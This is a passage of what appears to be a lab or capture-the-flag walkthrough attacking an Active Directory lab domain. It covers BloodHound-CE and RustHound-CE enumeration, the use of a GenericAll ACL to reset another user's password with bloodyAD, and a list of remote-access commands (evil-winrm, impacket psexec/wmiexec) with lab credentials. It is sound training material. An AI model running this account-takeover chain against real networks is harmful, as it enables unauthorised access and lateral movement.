+<p>We are unable to utilize any of these services. Lets move onto bloodhound to learn more about the network.</p>
+</blockquote>
+<h2 id="bloodhound-enumeration">BloodHound Enumeration</h2>
+<p>We need to enumerate the active directory network further. We will run RustHound-CE and then analyze the results using runoff, but runoff will require bloodhound-CE running.</p>
+<h3 id="install-bloodhound-ce">Install Bloodhound-CE</h3>
+<blockquote>
+<p>[!info] Tool: <a href="https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart">Bloodhound-CE</a></p>
+</blockquote>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>wget<span class="w"> </span>https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>tar<span class="w"> </span>-xvzf<span class="w"> </span>bloodhound-cli-linux-amd64.tar.gz
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>./bloodhound-cli<span class="w"> </span>install
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>BloodHound<span class="w"> </span>is<span class="w"> </span>ready<span class="w"> </span>to<span class="w"> </span>go!
+<a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>You<span class="w"> </span>can<span class="w"> </span>log<span class="w"> </span><span class="k">in</span><span class="w"> </span>as<span class="w"> </span><span class="sb">`</span>admin<span class="sb">`</span><span class="w"> </span>with<span class="w"> </span>this<span class="w"> </span>password:<span class="w"> </span>uHf8oMW1bXWF3U5DEulCJne9cugnPHDZ
+<a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>You<span class="w"> </span>can<span class="w"> </span>get<span class="w"> </span>your<span class="w"> </span>admin<span class="w"> </span>password<span class="w"> </span>by<span class="w"> </span>running:<span class="w"> </span>bloodhound-cli<span class="w"> </span>config<span class="w"> </span>get<span class="w"> </span>default_password
+<a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>You<span class="w"> </span>can<span class="w"> </span>access<span class="w"> </span>the<span class="w"> </span>BloodHound<span class="w"> </span>UI<span class="w"> </span>at:<span class="w"> </span>http://127.0.0.1:8080/ui/login
+</code></pre></div>
+<p>Now lets open the web browser and login.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>firefox<span class="w"> </span>http://127.0.0.1:8080/ui/login<span class="w"> </span><span class="p">&amp;</span>
+<a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a><span class="c1"># Username: admin</span>
+<a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a><span class="c1"># Password: uHf8oMW1bXWF3U5DEulCJne9cugnPHDZ</span>
+</code></pre></div>
+<p>Now lets run rusthound to get the information we need for bloodhound-ce</p>
+<h3 id="rusthound-ce">RustHound-CE</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>rusthound-ce<span class="w"> </span>-d<span class="w"> </span>hack.smarter<span class="w"> </span>-u<span class="w"> </span>bob.ross<span class="w"> </span>-p<span class="w"> </span><span class="s1">'137Password123!@#'</span><span class="w"> </span>-i<span class="w"> </span><span class="m">10</span>.0.19.80<span class="w">   </span>-z<span class="w"> </span>-o<span class="w"> </span>.
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>---------------------------------------------------
+<a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>Initializing<span class="w"> </span>RustHound-CE<span class="w"> </span>at<span class="w"> </span><span class="m">17</span>:38:06<span class="w"> </span>on<span class="w"> </span><span class="m">04</span>/19/26
+<a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a>Powered<span class="w"> </span>by<span class="w"> </span>@g0h4n_0
+<a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a>---------------------------------------------------
+<a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a>
+<a id="__codelineno-22-6" name="__codelineno-22-6" href="#__codelineno-22-6"></a><span class="o">[</span><span class="m">2026</span>-04-19T21:38:06Z<span class="w"> </span>INFO<span class="w">  </span>rusthound_ce<span class="o">]</span><span class="w"> </span>Verbosity<span class="w"> </span>level:<span class="w"> </span>Info
+<a id="__codelineno-22-7" name="__codelineno-22-7" href="#__codelineno-22-7"></a><span class="o">[</span><span class="m">2026</span>-04-19T21:38:06Z<span class="w"> </span>INFO<span class="w">  </span>rusthound_ce<span class="o">]</span><span class="w"> </span>Collection<span class="w"> </span>method:<span class="w"> </span>All
+<a id="__codelineno-22-8" name="__codelineno-22-8" href="#__codelineno-22-8"></a><span class="o">[</span><span class="m">2026</span>-04-19T21:38:06Z<span class="w"> </span>INFO<span class="w">  </span>rusthound_ce::ldap<span class="o">]</span><span class="w"> </span>Connected<span class="w"> </span>to<span class="w"> </span>HACK.SMARTER<span class="w"> </span>Active<span class="w"> </span>Directory!
+<a id="__codelineno-22-9" name="__codelineno-22-9" href="#__codelineno-22-9"></a><span class="o">[</span><span class="m">2026</span>-04-19T21:38:06Z<span class="w"> </span>INFO<span class="w">  </span>rusthound_ce::ldap<span class="o">]</span><span class="w"> </span>Starting<span class="w"> </span>data<span class="w"> </span>collection...
+<a id="__codelineno-22-10" name="__codelineno-22-10" href="#__codelineno-22-10"></a><span class="o">[</span><span class="m">2026</span>-04-19T21:38:06Z<span class="w"> </span>INFO<span class="w">  </span>rusthound_ce::ldap<span class="o">]</span><span class="w"> </span>Ldap<span class="w"> </span>filter<span class="w"> </span>:<span class="w"> </span><span class="o">(</span><span class="nv">objectClass</span><span class="o">=</span>*<span class="o">)</span>
+<a id="__codelineno-22-11" name="__codelineno-22-11" href="#__codelineno-22-11"></a><span class="o">[</span><span class="m">2026</span>-04-19T21:38:06Z<span class="w"> </span>INFO<span class="w">  </span>rusthound_ce::ldap<span class="o">]</span><span class="w"> </span>All<span class="w"> </span>data<span class="w"> </span>collected<span class="w"> </span><span class="k">for</span><span class="w"> </span>NamingContext<span class="w"> </span><span class="nv">DC</span><span class="o">=</span>hack,DC<span class="o">=</span>smarter
+<a id="__codelineno-22-12" name="__codelineno-22-12" href="#__codelineno-22-12"></a><span class="o">[</span><span class="m">2026</span>-04-19T21:38:06Z<span class="w"> </span>INFO<span class="w">  </span>rusthound_ce::ldap<span class="o">]</span><span class="w"> </span>Ldap<span class="w"> </span>filter<span class="w"> </span>:<span class="w"> </span><span class="o">(</span><span class="nv">objectClass</span><span class="o">=</span>*<span class="o">)</span>
+<a id="__codelineno-22-13" name="__codelineno-22-13" href="#__codelineno-22-13"></a><span class="o">[</span><span class="m">2026</span>-04-19T21:38:07Z<span class="w"> </span>INFO<span class="w">  </span>rusthound_ce::ldap<span class="o">]</span><span class="w"> </span>All<span class="w"> </span>data<span class="w"> </span>collected<span class="w"> </span><span class="k">for</span><span class="w"> </span>NamingContext<span class="w"> </span><span class="nv">CN</span><span class="o">=</span>Configuration,DC<span class="o">=</span>hack,DC<span class="o">=</span>smarter
+<a id="__codelineno-22-14" name="__codelineno-22-14" href="#__codelineno-22-14"></a><span class="o">[</span><span class="m">2026</span>-04-19T21:38:07Z<span class="w"> </span>INFO<span class="w">  </span>rusthound_ce::ldap<span class="o">]</span><span class="w"> </span>Ldap<span class="w"> </span>filter<span class="w"> </span>:<span class="w"> </span><span class="o">(</span><span class="nv">objectClass</span><span class="o">=</span>*<span class="o">)</span>
+<a id="__codelineno-22-15" name="__codelineno-22-15" href="#__codelineno-22-15"></a><span class="o">[</span><span class="m">2026</span>-04-19T21:38:07Z<span class="w"> </span>INFO<span class="w">  </span>rusthound_ce::ldap<span class="o">]</span><span class="w"> </span>All<span class="w"> </span>data<span class="w"> </span>collected<span class="w"> </span><span class="k">for</span><span class="w"> </span>NamingContext<span class="w"> </span><span class="nv">CN</span><span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>hack,DC<span class="o">=</span>smarter
+<a id="__codelineno-22-16" name="__codelineno-22-16" href="#__codelineno-22-16"></a><span class="o">[</span><span class="m">2026</span>-04-19T21:38:07Z<span class="w"> </span>INFO<span class="w">  </span>rusthound_ce::ldap<span class="o">]</span><span class="w"> </span>Ldap<span class="w"> </span>filter<span class="w"> </span>:<span class="w"> </span><span class="o">(</span><span class="nv">objectClass</span><span class="o">=</span>*<span class="o">)</span>
+<a id="__codelineno-22-17" name="__codelineno-22-17" href="#__codelineno-22-17"></a><span class="o">[</span><span class="m">2026</span>-04-19T21:38:07Z<span class="w"> </span>INFO<span class="w">  </span>rusthound_ce::ldap<span class="o">]</span><span class="w"> </span>All<span class="w"> </span>data<span class="w"> </span>collected<span class="w"> </span><span class="k">for</span><span class="w"> </span>NamingContext<span class="w"> </span><span class="nv">DC</span><span class="o">=</span>DomainDnsZones,DC<span class="o">=</span>hack,DC<span class="o">=</span>smarter
+<a id="__codelineno-22-18" name="__codelineno-22-18" href="#__codelineno-22-18"></a><span class="o">[</span><span class="m">2026</span>-04-19T21:38:07Z<span class="w"> </span>INFO<span class="w">  </span>rusthound_ce::ldap<span class="o">]</span><span class="w"> </span>Ldap<span class="w"> </span>filter<span class="w"> </span>:<span class="w"> </span><span class="o">(</span><span class="nv">objectClass</span><span class="o">=</span>*<span class="o">)</span>
+<a id="__codelineno-22-19" name="__codelineno-22-19" href="#__codelineno-22-19"></a><span class="o">[</span><span class="m">2026</span>-04-19T21:38:07Z<span class="w"> </span>INFO<span class="w">  </span>rusthound_ce::ldap<span class="o">]</span><span class="w"> </span>All<span class="w"> </span>data<span class="w"> </span>collected<span class="w"> </span><span class="k">for</span><span class="w"> </span>NamingContext<span class="w"> </span><span class="nv">DC</span><span class="o">=</span>ForestDnsZones,DC<span class="o">=</span>hack,DC<span class="o">=</span>smarter
+<a id="__codelineno-22-20" name="__codelineno-22-20" href="#__codelineno-22-20"></a><span class="o">[</span><span class="m">2026</span>-04-19T21:38:07Z<span class="w"> </span>INFO<span class="w">  </span>rusthound_ce::api<span class="o">]</span><span class="w"> </span>Starting<span class="w"> </span>the<span class="w"> </span>LDAP<span class="w"> </span>objects<span class="w"> </span>parsing...
+<a id="__codelineno-22-21" name="__codelineno-22-21" href="#__codelineno-22-21"></a><span class="o">[</span><span class="m">2026</span>-04-19T21:38:07Z<span class="w"> </span>INFO<span class="w">  </span>rusthound_ce::objects::domain<span class="o">]</span><span class="w"> </span>MachineAccountQuota:<span class="w"> </span><span class="m">10</span>
+<a id="__codelineno-22-22" name="__codelineno-22-22" href="#__codelineno-22-22"></a><span class="o">[</span><span class="m">2026</span>-04-19T21:38:07Z<span class="w"> </span>INFO<span class="w">  </span>rusthound_ce::api<span class="o">]</span><span class="w"> </span>Parsing<span class="w"> </span>LDAP<span class="w"> </span>objects<span class="w"> </span>finished!
+<a id="__codelineno-22-23" name="__codelineno-22-23" href="#__codelineno-22-23"></a><span class="o">[</span><span class="m">2026</span>-04-19T21:38:07Z<span class="w"> </span>INFO<span class="w">  </span>rusthound_ce::json::checker<span class="o">]</span><span class="w"> </span>Starting<span class="w"> </span>checker<span class="w"> </span>to<span class="w"> </span>replace<span class="w"> </span>some<span class="w"> </span>values...
+<a id="__codelineno-22-24" name="__codelineno-22-24" href="#__codelineno-22-24"></a><span class="o">[</span><span class="m">2026</span>-04-19T21:38:07Z<span class="w"> </span>INFO<span class="w">  </span>rusthound_ce::json::checker<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span>and<span class="w"> </span>replacing<span class="w"> </span>some<span class="w"> </span>values<span class="w"> </span>finished!
+<a id="__codelineno-22-25" name="__codelineno-22-25" href="#__codelineno-22-25"></a><span class="o">[</span><span class="m">2026</span>-04-19T21:38:07Z<span class="w"> </span>INFO<span class="w">  </span>rusthound_ce::json::maker::common<span class="o">]</span><span class="w"> </span><span class="m">7</span><span class="w"> </span>users<span class="w"> </span>parsed!
+<a id="__codelineno-22-26" name="__codelineno-22-26" href="#__codelineno-22-26"></a><span class="o">[</span><span class="m">2026</span>-04-19T21:38:07Z<span class="w"> </span>INFO<span class="w">  </span>rusthound_ce::json::maker::common<span class="o">]</span><span class="w"> </span><span class="m">61</span><span class="w"> </span>groups<span class="w"> </span>parsed!
+<a id="__codelineno-22-27" name="__codelineno-22-27" href="#__codelineno-22-27"></a><span class="o">[</span><span class="m">2026</span>-04-19T21:38:07Z<span class="w"> </span>INFO<span class="w">  </span>rusthound_ce::json::maker::common<span class="o">]</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>computers<span class="w"> </span>parsed!
+<a id="__codelineno-22-28" name="__codelineno-22-28" href="#__codelineno-22-28"></a><span class="o">[</span><span class="m">2026</span>-04-19T21:38:07Z<span class="w"> </span>INFO<span class="w">  </span>rusthound_ce::json::maker::common<span class="o">]</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>ous<span class="w"> </span>parsed!
+<a id="__codelineno-22-29" name="__codelineno-22-29" href="#__codelineno-22-29"></a><span class="o">[</span><span class="m">2026</span>-04-19T21:38:07Z<span class="w"> </span>INFO<span class="w">  </span>rusthound_ce::json::maker::common<span class="o">]</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>domains<span class="w"> </span>parsed!
+<a id="__codelineno-22-30" name="__codelineno-22-30" href="#__codelineno-22-30"></a><span class="o">[</span><span class="m">2026</span>-04-19T21:38:07Z<span class="w"> </span>INFO<span class="w">  </span>rusthound_ce::json::maker::common<span class="o">]</span><span class="w"> </span><span class="m">2</span><span class="w"> </span>gpos<span class="w"> </span>parsed!
+<a id="__codelineno-22-31" name="__codelineno-22-31" href="#__codelineno-22-31"></a><span class="o">[</span><span class="m">2026</span>-04-19T21:38:07Z<span class="w"> </span>INFO<span class="w">  </span>rusthound_ce::json::maker::common<span class="o">]</span><span class="w"> </span><span class="m">73</span><span class="w"> </span>containers<span class="w"> </span>parsed!
+<a id="__codelineno-22-32" name="__codelineno-22-32" href="#__codelineno-22-32"></a><span class="o">[</span><span class="m">2026</span>-04-19T21:38:07Z<span class="w"> </span>INFO<span class="w">  </span>rusthound_ce::json::maker::common<span class="o">]</span><span class="w"> </span>./20260419173807_hack-smarter_rusthound-ce.zip<span class="w"> </span>created!
+<a id="__codelineno-22-33" name="__codelineno-22-33" href="#__codelineno-22-33"></a>
+<a id="__codelineno-22-34" name="__codelineno-22-34" href="#__codelineno-22-34"></a>RustHound-CE<span class="w"> </span>Enumeration<span class="w"> </span>Completed<span class="w"> </span>at<span class="w"> </span><span class="m">17</span>:38:07<span class="w"> </span>on<span class="w"> </span><span class="m">04</span>/19/26!<span class="w"> </span>Happy<span class="w"> </span>Graphing!
+</code></pre></div>
+<blockquote>
+<p>Now we need to injest this data into bloodhound-ce and use the runoff tool to analyze the nodes.</p>
+</blockquote>
+<h3 id="runoff-bloodhound-ce-analyzer">Runoff (BloodHound-CE Analyzer)</h3>
+<p>We need to mark accounts we <em>own</em> so bloodhound can give us proper information</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>runoff<span class="w"> </span>-p<span class="w"> </span><span class="s1">'bloodhoundcommunityedition'</span><span class="w"> </span>mark<span class="w"> </span>owned<span class="w"> </span><span class="s1">'bob.ross@hack.smarter'</span>
+</code></pre></div>
+<p>Now lets run all queries with the quiet options so we don't have to sift through empty output and the abuse flag will give us the commands to take advantage of anything found.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>runoff<span class="w"> </span>-p<span class="w"> </span><span class="s1">'bloodhoundcommunityedition'</span><span class="w"> </span>-q<span class="w"> </span>--abuse<span class="w"> </span>run<span class="w"> </span>all
+</code></pre></div>
+<blockquote>
+<p>[!Important] Critical Findings from the output</p>
+</blockquote>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span><span class="o">[</span>CRITICAL<span class="o">]</span><span class="w"> </span>GenericAll<span class="w"> </span>ACL<span class="w"> </span>Abuse
+<a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a><span class="w">    </span>Found<span class="w"> </span><span class="m">2</span><span class="w"> </span>GenericAll<span class="w"> </span>relationship<span class="o">(</span>s<span class="o">)</span><span class="w"> </span>from<span class="w"> </span>non-admin<span class="w"> </span>principals<span class="w"> </span><span class="o">(</span>limit<span class="w"> </span><span class="m">200</span><span class="o">)</span>
+<a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a>╭──────────────────────────────┬───────┬───────────────────────────────┬─────────────┬─────────┬───────╮
+<a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a>│<span class="w"> </span>Principal<span class="w">                    </span>│<span class="w"> </span>Type<span class="w">  </span>│<span class="w"> </span>Target<span class="w">                        </span>│<span class="w"> </span>Target<span class="w"> </span>Type<span class="w"> </span>│<span class="w"> </span>Status<span class="w">  </span>│<span class="w"> </span>Admin<span class="w"> </span>│
+<a id="__codelineno-25-5" name="__codelineno-25-5" href="#__codelineno-25-5"></a>├──────────────────────────────┼───────┼───────────────────────────────┼─────────────┼─────────┼───────┤
+<a id="__codelineno-25-6" name="__codelineno-25-6" href="#__codelineno-25-6"></a>│<span class="w"> </span>CERT<span class="w"> </span>PUBLISHERS@HACK.SMARTER<span class="w"> </span>│<span class="w"> </span>Group<span class="w"> </span>│<span class="w"> </span>AIA@HACK.SMARTER<span class="w">              </span>│<span class="w"> </span>Container<span class="w">   </span>│<span class="w"> </span>Enabled<span class="w"> </span>│<span class="w"> </span>No<span class="w">    </span>│
+<a id="__codelineno-25-7" name="__codelineno-25-7" href="#__codelineno-25-7"></a>├──────────────────────────────┼───────┼───────────────────────────────┼─────────────┼─────────┼───────┤
+<a id="__codelineno-25-8" name="__codelineno-25-8" href="#__codelineno-25-8"></a>│<span class="w"> </span>BOB.ROSS@HACK.SMARTER<span class="w">        </span>│<span class="w"> </span>User<span class="w">  </span>│<span class="w"> </span>ALICE.WONDERLAND@HACK.SMARTER<span class="w"> </span>│<span class="w"> </span>User<span class="w">        </span>│<span class="w"> </span>Enabled<span class="w"> </span>│<span class="w"> </span>No<span class="w">    </span>│
+<a id="__codelineno-25-9" name="__codelineno-25-9" href="#__codelineno-25-9"></a>╰──────────────────────────────┴───────┴───────────────────────────────┴─────────────┴─────────┴───────╯
+</code></pre></div>
+<h4 id="abusing-genricall-acl">Abusing GenricAll ACL</h4>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>bloodyAD<span class="w"> </span>-d<span class="w"> </span>HACK.SMARTER<span class="w"> </span>-u<span class="w"> </span><span class="s1">'bob.ross'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'137Password123!@#'</span><span class="w"> </span>--host<span class="w"> </span><span class="m">10</span>.0.19.80<span class="w"> </span><span class="nb">set</span><span class="w"> </span>password<span class="w"> </span>ALICE.WONDERLAND<span class="w"> </span><span class="s1">'Passw0rd!2025'</span>
+</code></pre></div>
+<blockquote>
+<p>[!important] <code>[+] Password changed successfully!</code></p>
+</blockquote>
+<p>Now we need to add this user to our known_users file and then mark this user as owed in the database.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>runoff<span class="w"> </span>-p<span class="w"> </span><span class="s1">'bloodhoundcommunityedition'</span><span class="w"> </span>mark<span class="w"> </span>owned<span class="w"> </span><span class="s1">'alice.wonderland@hack.smarter'</span>
+</code></pre></div>
+<blockquote>
+<p>I am not seeing anything right away, lets use this new users creds to enumerate the AD with maelstrom.</p>
+</blockquote>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>maelstrom<span class="w"> </span><span class="m">10</span>.0.19.80<span class="w"> </span>-u<span class="w"> </span><span class="s1">'alice.wonderland'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'Passw0rd!2025'</span><span class="w"> </span>-A<span class="w"> </span>-o<span class="w"> </span>alice_enumeration.txt
+</code></pre></div>
+<p>We only need to annotate new findings. We have ran this already on bob.ross and null.... and there was nothing new, lets try Rapids</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>rapids<span class="w"> </span>-t<span class="w"> </span><span class="m">10</span>.0.19.80<span class="w"> </span>-C<span class="w"> </span>known_users<span class="w"> </span>--verify<span class="w"> </span>--commands
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a><span class="w">                                                                     </span>Valid<span class="w"> </span>Credentials<span class="w">                                                                      </span>
+<a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>┏━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+<a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a>┃<span class="w"> </span>Service<span class="w">    </span>┃<span class="w"> </span>Target<span class="w">          </span>┃<span class="w"> </span>Username<span class="w">         </span>┃<span class="w"> </span>Password<span class="w">          </span>┃<span class="w"> </span>Proof<span class="w">                                                                              </span>┃
+<a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a>┡━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩
+<a id="__codelineno-30-5" name="__codelineno-30-5" href="#__codelineno-30-5"></a>│<span class="w"> </span>evil-winrm<span class="w"> </span>│<span class="w"> </span><span class="m">10</span>.0.19.80:5985<span class="w"> </span>│<span class="w"> </span>alice.wonderland<span class="w"> </span>│<span class="w"> </span>Passw0rd!2025<span class="w">     </span>│<span class="w"> </span>hack<span class="se">\a</span>lice.wonderland<span class="w"> </span><span class="p">|</span><span class="w"> </span>DC01<span class="w">                                                       </span>│
+<a id="__codelineno-30-6" name="__codelineno-30-6" href="#__codelineno-30-6"></a>│<span class="w"> </span>kerberos<span class="w">   </span>│<span class="w"> </span><span class="m">10</span>.0.19.80:88<span class="w">   </span>│<span class="w">                  </span>│<span class="w">                   </span>│<span class="w"> </span>TGT<span class="w"> </span>obtained<span class="w"> </span><span class="k">for</span><span class="w"> </span>alice.wonderland@hack.smarter<span class="w">                                     </span>│
+<a id="__codelineno-30-7" name="__codelineno-30-7" href="#__codelineno-30-7"></a>│<span class="w"> </span>ldap<span class="w">       </span>│<span class="w"> </span><span class="m">10</span>.0.19.80:389<span class="w">  </span>│<span class="w">                  </span>│<span class="w">                   </span>│<span class="w"> </span><span class="nv">namingContexts</span><span class="o">=[</span><span class="s1">'DC=hack,DC=smarter'</span>,<span class="w"> </span><span class="s1">'CN=Configuration,DC=hack,DC=smarter'</span>,<span class="w">       </span>│
+<a id="__codelineno-30-8" name="__codelineno-30-8" href="#__codelineno-30-8"></a>│<span class="w">            </span>│<span class="w">                 </span>│<span class="w">                  </span>│<span class="w">                   </span>│<span class="w"> </span><span class="s1">'CN=Schema,CN=Configuration,DC=hack,DC=smarter'</span>,<span class="w">                                   </span>│
+<a id="__codelineno-30-9" name="__codelineno-30-9" href="#__codelineno-30-9"></a>│<span class="w">            </span>│<span class="w">                 </span>│<span class="w">                  </span>│<span class="w">                   </span>│<span class="w"> </span><span class="s1">'DC=DomainDnsZones,DC=hack,DC=smarter'</span>,<span class="w"> </span><span class="s1">'DC=ForestDnsZones,DC=hack,DC=smarter'</span><span class="o">]</span><span class="w">    </span>│
+<a id="__codelineno-30-10" name="__codelineno-30-10" href="#__codelineno-30-10"></a>│<span class="w"> </span>smb<span class="w">        </span>│<span class="w"> </span><span class="m">10</span>.0.19.80:445<span class="w">  </span>│<span class="w">                  </span>│<span class="w">                   </span>│<span class="w"> </span>Shares:<span class="w"> </span>ADMIN$,<span class="w"> </span>C$,<span class="w"> </span>IPC$,<span class="w"> </span>NETLOGON,<span class="w"> </span>Share,<span class="w"> </span>SYSVOL<span class="w">                                  </span>│
+<a id="__codelineno-30-11" name="__codelineno-30-11" href="#__codelineno-30-11"></a>│<span class="w"> </span>wmi<span class="w">        </span>│<span class="w"> </span><span class="m">10</span>.0.19.80:135<span class="w">  </span>│<span class="w">                  </span>│<span class="w">                   </span>│<span class="w"> </span>wmi<span class="w"> </span><span class="nb">bind</span><span class="w"> </span>OK<span class="w">                                                                        </span>│
+<a id="__codelineno-30-12" name="__codelineno-30-12" href="#__codelineno-30-12"></a>├────────────┼─────────────────┼──────────────────┼───────────────────┼────────────────────────────────────────────────────────────────────────────────────┤
+<a id="__codelineno-30-13" name="__codelineno-30-13" href="#__codelineno-30-13"></a>
+<a id="__codelineno-30-14" name="__codelineno-30-14" href="#__codelineno-30-14"></a><span class="w">  </span>Connect<span class="w"> </span>Commands
+<a id="__codelineno-30-15" name="__codelineno-30-15" href="#__codelineno-30-15"></a>
+<a id="__codelineno-30-16" name="__codelineno-30-16" href="#__codelineno-30-16"></a><span class="w">  </span><span class="c1"># alice.wonderland@10.0.19.80 (evil-winrm, kerberos, ldap, smb, wmi)</span>
+<a id="__codelineno-30-17" name="__codelineno-30-17" href="#__codelineno-30-17"></a><span class="w">  </span>evil-winrm<span class="w"> </span>-i<span class="w"> </span><span class="m">10</span>.0.19.80<span class="w"> </span>-u<span class="w"> </span>alice.wonderland<span class="w"> </span>-p<span class="w"> </span><span class="s1">'Passw0rd!2025'</span>
+<a id="__codelineno-30-18" name="__codelineno-30-18" href="#__codelineno-30-18"></a><span class="w">  </span>impacket-getTGT<span class="w"> </span>hack.smarter/alice.wonderland:<span class="s1">'Passw0rd!2025'</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.0.19.80
+<a id="__codelineno-30-19" name="__codelineno-30-19" href="#__codelineno-30-19"></a><span class="w">  </span>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://10.0.19.80:389<span class="w"> </span>-D<span class="w"> </span><span class="s1">'alice.wonderland@hack.smarter'</span><span class="w"> </span>-w<span class="w"> </span><span class="s1">'Passw0rd!2025'</span><span class="w"> </span>-b<span class="w"> </span><span class="s1">''</span><span class="w"> </span>-s<span class="w"> </span>base<span class="w"> </span>namingContexts
+<a id="__codelineno-30-20" name="__codelineno-30-20" href="#__codelineno-30-20"></a><span class="w">  </span>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://10.0.19.80:389<span class="w"> </span>-D<span class="w"> </span><span class="s1">'alice.wonderland@hack.smarter'</span><span class="w"> </span>-w<span class="w"> </span><span class="s1">'Passw0rd!2025'</span><span class="w"> </span>-b<span class="w"> </span><span class="s1">'DC=hack,DC=smarter'</span><span class="w"> </span><span class="s1">'(objectClass=user)'</span><span class="w"> </span>sAMAccountName<span class="w">  </span>
+<a id="__codelineno-30-21" name="__codelineno-30-21" href="#__codelineno-30-21"></a><span class="c1"># requires domain (base DN)</span>
+<a id="__codelineno-30-22" name="__codelineno-30-22" href="#__codelineno-30-22"></a><span class="w">  </span>smbclient<span class="w"> </span>-L<span class="w"> </span>//10.0.19.80<span class="w"> </span>-U<span class="w"> </span><span class="s1">'hack.smarter\alice.wonderland%Passw0rd!2025'</span>
+<a id="__codelineno-30-23" name="__codelineno-30-23" href="#__codelineno-30-23"></a><span class="w">  </span>impacket-smbexec<span class="w"> </span>hack.smarter/alice.wonderland:<span class="s1">'Passw0rd!2025'</span>@10.0.19.80<span class="w">  </span><span class="c1"># requires local admin</span>
+<a id="__codelineno-30-24" name="__codelineno-30-24" href="#__codelineno-30-24"></a><span class="w">  </span>impacket-psexec<span class="w"> </span>hack.smarter/alice.wonderland:<span class="s1">'Passw0rd!2025'</span>@10.0.19.80<span class="w">  </span><span class="c1"># requires local admin</span>
+<a id="__codelineno-30-25" name="__codelineno-30-25" href="#__codelineno-30-25"></a><span class="w">  </span>smbclient<span class="w"> </span>//10.0.19.80/C$<span class="w"> </span>-U<span class="w"> </span><span class="s1">'hack.smarter\alice.wonderland%Passw0rd!2025'</span><span class="w">  </span><span class="c1"># requires local admin</span>
+<a id="__codelineno-30-26" name="__codelineno-30-26" href="#__codelineno-30-26"></a><span class="w">  </span>impacket-wmiexec<span class="w"> </span>hack.smarter/alice.wonderland:<span class="s1">'Passw0rd!2025'</span>@10.0.19.80<span class="w">  </span><span class="c1"># requires local admin</span>
+</code></pre></div>
+<blockquote>
+<p>[!important] Looks like we can connect with evil-winrm. So lets do that and upload something to get a stable shell.</p>
+</blockquote>
